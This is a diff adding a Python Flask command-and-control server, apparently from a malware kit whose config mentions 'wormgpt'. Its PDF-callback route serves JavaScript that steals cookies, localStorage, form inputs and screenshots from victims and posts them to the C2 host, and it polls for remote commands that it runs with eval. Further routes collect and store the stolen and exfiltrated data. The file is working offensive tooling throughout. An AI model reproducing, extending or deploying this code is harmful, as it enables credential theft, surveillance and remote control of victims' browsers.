@@ -1,0 +1,314 @@
+from flask import Flask, render_template, request, jsonify, Response
+from flask_socketio import SocketIO, emit
+from core.data_processor import DataProcessor
+from c2.comms_manager import CommsManager
+from core.session_manager import SessionManager
+from core.database_manager import DatabaseManager
+from core.config_manager import ConfigManager
+import threading
+import datetime
+import json
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = 'SECRET_KEY_HERE'
+socketio = SocketIO(app)
+
+class C2Server:
+    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
+        self.config = config_manager
+        self.session_manager = session_manager
+        self.exfil_engine = exfil_engine
+        self.comms_manager = CommsManager(config_manager, session_manager, exfil_engine)
+        self.data_processor = DataProcessor(self.config.get('evasion.polymorphic.encryption_key', 'wormgpt_key_2026'))
+        self.running = False
+        
+        # Register routes
+        app.route('/')(self.index)
+        app.route('/api/command', methods=['POST'])(self.receive_command)
+        app.route('/api/sessions')(self.list_sessions)
+        app.route('/api/data/<session_id>')(self.get_session_data)
+        app.route('/api/callback')(self.handle_pdf_callback)
+        app.route('/api/data', methods=['POST'])(self.receive_client_data)
+        app.route('/api/commands/<session_id>')(self.get_commands_for_client)
+        app.route('/api/screenshot', methods=['POST'])(self.receive_screenshot)
+        app.route('/api/forms', methods=['POST'])(self.receive_form_data)
+        # Add exfiltration endpoint
+        app.route('/api/exfil', methods=['POST'])(self.receive_exfil_data)
+        # SocketIO events
+        socketio.on('client_event')(self.handle_client_event)
+
+    def index(self):
+        return render_template('dashboard.html')
+
+    def list_sessions(self):
+        sessions = self.session_manager.get_active_sessions()
+        return jsonify(sessions)
+
+    def get_session_data(self, session_id):
+        data = self.session_manager.get_session(session_id)
+        return jsonify(data)
+
+    def receive_command(self):
+        data = request.json
+        self.comms_manager.dispatch_command(data['session_id'], data['command'])
+        return jsonify({'status': 'ok'})
+
+    def handle_client_event(self):
+        # Real-time stream handling
+        pass
+    
+    def handle_pdf_callback(self):
+        """Handle callback from malicious PDF"""
+        # Get client information
+        user_agent = request.headers.get('User-Agent', 'unknown')
+        ip_address = request.remote_addr
+        
+        # Create a new session for this PDF victim
+        session_id = self.session_manager.create_session({
+            'target_phone': 'unknown',
+            'target_os': 'pdf_exploit',
+            'target_app': 'pdf_reader',
+            'status': 'active',
+            'created_at': datetime.datetime.now().isoformat(),
+            'metadata': {
+                'user_agent': user_agent,
+                'ip_address': ip_address,
+                'exploit_vector': 'pdf'
+            }
+        })
+        
+        # Return additional JavaScript to execute on the client
+        response_script = f"""
+        // Send additional data back to C2
+        function sendSystemInfo() {{
+            var info = {{
+                session_id: "{session_id}",
+                platform: navigator.platform,
+                language: navigator.language,
+                screen_resolution: screen.width + "x" + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: document.cookie,
+                local_storage: {{}}
+            }};
+            
+            // Collect localStorage data
+            try {{
+                for (var i = 0; i < localStorage.length; i++) {{
+                    var key = localStorage.key(i);
+                    info.local_storage[key] = localStorage.getItem(key);
+                }}
+            }} catch(e) {{
+                console.log("Error accessing localStorage: " + e.message);
+            }}
+            
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://{self.config.get('c2.host')}:{self.config.get('c2.port')}/api/data", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(info));
+        }}
+        
+        // Function to capture screenshots
+        function captureScreen() {{
+            if (typeof html2canvas !== 'undefined') {{
+                html2canvas(document.body).then(function(canvas) {{
+                    var imageData = canvas.toDataURL("image/png");
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", "http://{self.config.get('c2.host')}:{self.config.get('c2.port')}/api/screenshot", true);
+                    xhr.setRequestHeader("Content-Type", "application/json");
+                    xhr.send(JSON.stringify({{
+                        session_id: "{session_id}",
+                        image: imageData
+                    }}));
+                }});
+            }}
+        }}
+        
+        // Function to execute commands from C2
+        function checkForCommands() {{
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "http://{self.config.get('c2.host')}:{self.config.get('c2.port')}/api/commands/{session_id}", true);
+            xhr.onreadystatechange = function() {{
+                if (xhr.readyState == 4 && xhr.status == 200) {{
+                    try {{
+                        var commands = JSON.parse(xhr.responseText);
+                        if (commands && commands.length > 0) {{
+                            for (var i = 0; i < commands.length; i++) {{
+                                eval(commands[i].command);
+                            }}
+                        }}
+                    }} catch(e) {{
+                        console.log("Error executing commands: " + e.message);
+                    }}
+                }}
+            }};
+            xhr.send();
+        }}
+        
+        // Function to exfiltrate form data
+        function exfiltrateForms() {{
+            var forms = document.querySelectorAll("form");
+            var formData = [];
+            
+            for (var i = 0; i < forms.length; i++) {{
+                var form = forms[i];
+                var inputs = form.querySelectorAll("input, select, textarea");
+                var data = {{}};
+                
+                for (var j = 0; j < inputs.length; j++) {{
+                    var input = inputs[j];
+                    if (input.name && input.value) {{
+                        data[input.name] = input.value;
+                    }}
+                }}
+                
+                formData.push({{
+                    action: form.action,
+                    method: form.method,
+                    data: data
+                }});
+            }}
+            
+            if (formData.length > 0) {{
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "http://{self.config.get('c2.host')}:{self.config.get('c2.port')}/api/forms", true);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify({{
+                    session_id: "{session_id}",
+                    forms: formData
+                }}));
+            }}
+        }}
+        
+        // Execute immediately
+        sendSystemInfo();
+        
+        // Continue sending data periodically
+        setInterval(sendSystemInfo, 30000);
+        setInterval(checkForCommands, 10000);
+        setInterval(exfiltrateForms, 60000);
+        
+        // Take a screenshot every 5 minutes
+        setInterval(captureScreen, 300000);
+        """
+        
+        return response_script, 200, {'Content-Type': 'application/javascript'}
+    
+    def receive_client_data(self):
+        """Receive data from the PDF exploit client"""
+        data = request.json
+        session_id = data.get('session_id')
+        
+        if not session_id:
+            return jsonify({'status': 'error', 'message': 'Missing session_id'}), 400
+        
+        # Store the received data
+        self.session_manager.db.insert_collected_data(
+            session_id=session_id,
+            data_type='system_info',
+            payload=json.dumps(data),
+            metadata={'timestamp': datetime.datetime.now().isoformat()}
+        )
+        
+        return jsonify({'status': 'ok'})
+
+    def get_commands_for_client(self, session_id):
+        """Get pending commands for a client"""
+        # Get pending commands for this session
+        commands = self.session_manager.get_pending_commands(session_id)
+        
+        # Mark commands as sent
+        for cmd in commands:
+            self.session_manager.update_command_status(cmd['id'], 'sent')
+        
+        return jsonify(commands)
+
+    def receive_screenshot(self):
+        """Receive screenshot from client"""
+        data = request.json
+        session_id = data.get('session_id')
+        image_data = data.get('image')
+        
+        if not session_id or not image_data:
+            return jsonify({'status': 'error', 'message': 'Missing session_id or image'}), 400
+        
+        # Store the screenshot
+        self.session_manager.db.insert_collected_data(
+            session_id=session_id,
+            data_type='screenshot',
+            payload=image_data,
+            metadata={'timestamp': datetime.datetime.now().isoformat()}
+        )
+        
+        return jsonify({'status': 'ok'})
+
+    def receive_form_data(self):
+        """Receive form data from client"""
+        data = request.json
+        session_id = data.get('session_id')
+        forms = data.get('forms')
+        
+        if not session_id or not forms:
+            return jsonify({'status': 'error', 'message': 'Missing session_id or forms'}), 400
+        
+        # Store the form data
+        self.session_manager.db.insert_collected_data(
+            session_id=session_id,
+            data_type='form_data',
+            payload=json.dumps(forms),
+            metadata={'timestamp': datetime.datetime.now().isoformat()}
+        )
+        
+        return jsonify({'status': 'ok'})
+    
+    def receive_exfil_data(self):
+        """Receive exfiltrated data from clients"""
+        data = request.json
+        session_id = data.get('session')
+        data_type = data.get('type')
+        timestamp = data.get('timestamp')
+        encoded_data = data.get('data')
+        
+        if not all([session_id, data_type, encoded_data]):
+            return jsonify({'status': 'error', 'message': 'Missing required fields'}), 400
+        
+        # Check if session exists, create if not
+        if not self.session_manager.session_exists(session_id):
+            self.session_manager.create_session({
+                'session_id': session_id,
+                'status': 'active',
+                'created_at': datetime.datetime.now().isoformat(),
+                'metadata': {
+                    'client_type': 'exfil_agent',
+                    'first_seen': timestamp
+                }
+            })
+
+        self.data_processor = DataProcessor(self.config.get('evasion.polymorphic.encryption_key', 'wormgpt_key_2026'))
+        
+        # Store the exfiltrated data
+        self.session_manager.db.insert_collected_data(
+            session_id=session_id,
+            data_type=data_type,
+            payload=encoded_data,
+            metadata={
+                'timestamp': timestamp,
+                'encrypted': True,
+                'compression': 'gzip',
+                'encoding': 'base64'
+            }
+        )
+        
+        # Update session last activity
+        self.session_manager.update_session_activity(session_id, timestamp)
+        
+        return jsonify({'status': 'ok'})
+
+    def start(self):
+        self.running = True
+        # Run Flask in a thread
+        t = threading.Thread(target=lambda: socketio.run(app, host=self.config.get('c2.host'), port=self.config.get('c2.port')))
+        t.start()
+
+    def stop(self):
+        self.running = False
+        socketio.stop()
